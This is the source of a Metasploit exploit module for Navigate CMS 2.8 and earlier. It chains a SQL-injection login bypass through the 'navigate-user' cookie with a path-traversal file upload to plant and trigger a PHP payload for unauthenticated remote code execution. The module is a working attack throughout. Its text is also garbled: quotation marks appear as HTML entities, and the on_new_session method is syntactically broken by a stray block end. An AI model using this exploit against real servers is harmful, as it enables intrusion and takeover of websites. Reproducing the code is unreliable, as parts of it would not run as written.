# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;Navigate CMS Unauthenticated Remote Code Execution&#039;,
      &#039;Description&#039; => %q(
        This module exploits insufficient sanitization in the database::protect
        method, of Navigate CMS versions 2.8 and prior, to bypass authentication.
 
        The module then uses a path traversal vulnerability in navigate_upload.php
        that allows authenticated users to upload PHP files to arbitrary locations.
        Together these vulnerabilities allow an unauthenticated attacker to
        execute arbitrary PHP code remotely.
 
        This module was tested against Navigate CMS 2.8.
      ),
      &#039;Author&#039; =>
        [
          &#039;Pyriphlegethon&#039; # Discovery / msf module
        ],
      &#039;License&#039; => MSF_LICENSE,
      &#039;References&#039; =>
        [
          [&#039;CVE&#039;, &#039;2018-17552&#039;], # Authentication bypass
          [&#039;CVE&#039;, &#039;2018-17553&#039;]  # File upload
        ],
      &#039;Privileged&#039; => false,
      &#039;Platform&#039; => [&#039;php&#039;],
      &#039;Arch&#039; => ARCH_PHP,
      &#039;Targets&#039; =>
        [
          [&#039;Automatic&#039;, {}]
        ],
      &#039;DefaultTarget&#039; => 0,
      &#039;DisclosureDate&#039; => &#039;Sep 26 2018&#039;))
 
    register_options [
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;Base Navigate CMS directory path&#039;, &#039;/navigate/&#039;]),
    ]
  end
 
  def login_bypass
    check_resp = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/login.php&#039;)
    )
 
    login_bypass_resp = send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/login.php&#039;),
      &#039;cookie&#039; => &#039;navigate-user=\" OR TRUE--%20&#039;
    )
 
    if login_bypass_resp &&
       login_bypass_resp.code == 302 &&
       check_resp.body.include?(&#039;Navigate CMS&#039;)
      session_id = login_bypass_resp.get_cookies_parsed
                                    .values.select { |v| v.to_s.include?(&#039;NVSID_&#039;) }
                                    .first.first
      return session_id
    end
  end
 
  def check
    return CheckCode::Vulnerable if login_bypass
    CheckCode::Safe
  end
 
  def exploit
    session_id = login_bypass
    fail_with(Failure::NoAccess, &#039;Login bypass failed&#039;) unless session_id
 
    print_good(&#039;Login bypass successful&#039;)
 
    php = payload.encoded
    data = Rex::MIME::Message.new
    data.add_part(php, &#039;image/jpeg&#039;, nil,
      "form-data; name=\"file\"; filename=\"#{rand_text_alphanumeric(10..15)}\"")
    data_post = data.to_s
 
    upload = send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/navigate_upload.php&#039;),
      &#039;vars_get&#039; => Hash[{
        &#039;session_id&#039; => session_id,
        &#039;engine&#039; => &#039;picnik&#039;,
        &#039;id&#039; => &#039;../../../navigate_info.php&#039;
      }.to_a.shuffle],
      &#039;ctype&#039; => "multipart/form-data; boundary=#{data.bound}",
      &#039;data&#039; => data_post
    )
 
    fail_with(Failure::Unreachable, &#039;Unable to reach target&#039;) unless upload
    fail_with(Failure::Unknown, &#039;Upload unsuccessful&#039;) unless upload.code == 200
 
    print_good(&#039;Upload successful&#039;)
 
    print_status(&#039;Triggering payload...&#039;)
    send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/navigate_info.php&#039;)
    )
  end
 
  def on_new_session(session)
    super
      print_error(&#039;Unable to restore navigate_info.php&#039;)
      return
    end
 
    session.core.use(&#039;stdapi&#039;) if !session.ext.aliases.include?(&#039;stdapi&#039;)
 
    begin
      session.fs.file.open(&#039;navigate_info.php&#039;, &#039;w&#039;).write("<?php\n\nphpinfo();\n\n?>")
    rescue
      print_error(&#039;Unable to restore navigate_info.php&#039;)
    end
  end
end

